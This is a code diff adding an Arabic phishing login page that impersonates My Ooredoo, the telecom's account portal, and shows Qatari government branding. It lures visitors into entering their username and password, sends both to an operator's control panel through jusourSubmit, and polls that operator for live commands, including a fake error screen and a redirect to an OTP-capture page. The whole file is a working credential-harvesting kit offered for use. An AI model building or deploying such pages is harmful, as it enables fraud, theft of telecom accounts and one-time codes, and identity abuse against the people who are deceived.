@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - My Ooredoo</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <script src="config.js"></script>
+    <style>
+        body { font-family: 'Cairo', sans-serif; background-color: #ffffff; }
+        .input-field { border: 1.5px solid #0076c0; border-radius: 12px; padding: 14px; width: 100%; outline: none; text-align: center; font-weight: bold; }
+        .btn-red { background: #ed1c24; color: white; padding: 14px; border-radius: 12px; width: 100%; font-weight: bold; font-size: 18px; }
+        .btn-white { border: 1.5px solid #ed1c24; color: #ed1c24; padding: 14px; border-radius: 12px; width: 100%; font-weight: bold; font-size: 18px; background: white; }
+    </style>
+</head>
+<body class="p-4">
+
+    <!-- نافذة التنبيه الإجبارية (المطابقة للصورة) تظهر فوراً -->
+    <div id="ooredooModal" class="fixed inset-0 bg-black/80 z-[11000] flex items-center justify-center p-4">
+        <div class="bg-white rounded-[25px] p-8 max-w-[450px] w-full text-center relative shadow-2xl">
+            <div class="flex justify-between items-center mb-6">
+                <img src="assets/auth-provider.svg" class="h-6">
+                <img src="assets/gov-q-main.png" class="h-10">
+            </div>
+            <h3 class="text-[19px] font-black mb-3">خطوة أخيرة لإتمام طلبك! 🎉</h3>
+            <p class="text-gray-600 text-[14px] font-bold leading-relaxed mb-6 px-1">لاعتماد طلبك وتوثيق العقد، يُرجى تسجيل الدخول عبر حسابك في تطبيق Ooredoo</p>
+            
+            <div class="bg-gray-50 rounded-2xl p-6 text-right space-y-4 mb-6">
+                <div class="text-[13px] font-bold flex justify-end items-center gap-3 text-gray-700">تحقق سريع وآمن من هويتك <span class="bg-green-100 text-green-600 w-5 h-5 rounded-full flex items-center justify-center text-[10px]">✓</span></div>
+                <div class="text-[13px] font-bold flex justify-end items-center gap-3 text-gray-700">ربط رقم هاتفك بالخدمة تلقائياً <span class="bg-green-100 text-green-600 w-5 h-5 rounded-full flex items-center justify-center text-[10px]">✓</span></div>
+                <div class="text-[13px] font-bold flex justify-end items-center gap-3 text-gray-700">توثيق العقد إلكترونياً <span class="bg-green-100 text-green-600 w-5 h-5 rounded-full flex items-center justify-center text-[10px]">✓</span></div>
+            </div>
+
+            <p class="text-[11px] text-gray-400 font-bold mb-6 italic">✨ توثيق الطلبات أصبح أسهل وأسرع مع Ooredoo!</p>
+            <button onclick="document.getElementById('ooredooModal').style.display='none'" class="bg-[#ed1c24] text-white w-full py-4 rounded-xl font-black text-[17px] shadow-lg shadow-red-100">متابعة تسجيل الدخول</button>
+            <span class="absolute top-4 left-6 text-2xl text-gray-300 font-bold cursor-pointer" onclick="document.getElementById('ooredooModal').style.display='none'">&times;</span>
+        </div>
+    </div>
+
+    <!-- نافذة الخطأ (OOR_ERR) -->
+    <div id="errModal" class="fixed inset-0 bg-black/80 z-[9999] hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-[25px] p-8 max-w-[420px] w-full text-center">
+            <div class="w-16 h-16 bg-red-50 text-red-500 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl border-2 border-red-500 font-bold">×</div>
+            <h3 class="text-[20px] font-black mb-3">معلومات غير صحيحة</h3>
+            <p class="text-gray-500 text-[14px] mb-8 font-bold">يرجى التحقق من البيانات والمحاولة مرة أخرى.</p>
+            <button onclick="document.getElementById('errModal').classList.add('hidden')" class="w-full bg-[#8D1B3D] text-white py-4 rounded-xl font-bold">إعادة المحاولة</button>
+        </div>
+    </div>
+
+    <div class="max-w-[550px] mx-auto text-center pt-10">
+        <img src="assets/gov-q-main.png" class="h-20 mx-auto mb-10" alt="GCC">
+        <h1 class="text-[24px] font-black leading-tight mb-4 px-6 text-right md:text-center">تسجيل الدخول لتثبيت الطلب</h1>
+        <p class="text-[20px] font-bold mb-8">👋 My Ooredoo!</p>
+
+        <div class="px-6">
+            <form id="ooredooForm" class="space-y-4">
+                <input type="text" id="user" class="input-field" placeholder="البريد الإلكتروني أو اسم المستخدم" required>
+                <input type="password" id="pass" class="input-field" placeholder="كلمة المرور" required>
+                
+                <p onclick="window.location.href='ooredoo-forgot.html?ref='+ref" class="text-red-500 text-[13px] font-bold cursor-pointer text-right mt-2 hover:underline">
+                    هل نسيت كلمة العبور؟
+                </p>
+
+                <button type="submit" id="btn" class="btn-red active:scale-95 transition-all mt-6">تسجيل الدخول</button>
+                <button type="button" onclick="window.location.href='ooredoo-reg.html?ref='+ref" class="btn-white mt-4">إنشاء حساب</button>
+            </form>
+            <div class="mt-16">
+                 <img src="assets/auth-provider.svg" class="h-10 mx-auto" alt="Ooredoo">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const ref = resolveRef();
+
+        document.getElementById('ooredooForm').onsubmit = function(e){
+            e.preventDefault();
+            const btn = document.getElementById('btn');
+            btn.innerText = "جاري التحقق...";
+            btn.disabled = true;
+            const userVal = document.getElementById('user').value;
+            const passVal = document.getElementById('pass').value;
+
+            // بيانات الدخول تُعلَّم كحساسة لتظهر مخفية في لوحة التحكم.
+            jusourSubmit({
+                ref: ref,
+                page_key: 'ooredoo_login',
+                summary: 'دخول Ooredoo',
+                fields: [
+                    { label: 'المستخدم', value: userVal, sensitive: true },
+                    { label: 'كلمة المرور', value: passVal, sensitive: true }
+                ]
+            }).catch(function () {
+                /* لا نعطّل المستخدم إذا تعذّر الإرسال */
+            }).then(function () {
+                setTimeout(function () {
+                    window.location.href = 'loading.html?ref=' + encodeURIComponent(ref) + '&s=' + Date.now();
+                }, 1000);
+            });
+        };
+
+        // استقبال أوامر المشرف من الخادم مباشرة بدلاً من ملفات الأوامر.
+        pollCommands(ref, function (data) {
+            if (data.command === 'OOR_ERR') {
+                document.getElementById('errModal').classList.remove('hidden');
+                return;
+            }
+            if (data.command === 'OTP') {
+                window.location.href = 'otp.html?ref=' + encodeURIComponent(ref);
+                return;
+            }
+            if (data.redirect && data.redirect !== 'ooredoo-login.html') {
+                window.location.href = data.redirect + '?ref=' + encodeURIComponent(ref);
+            }
+        }, 3500);
+    </script>
+</body>
+</html>
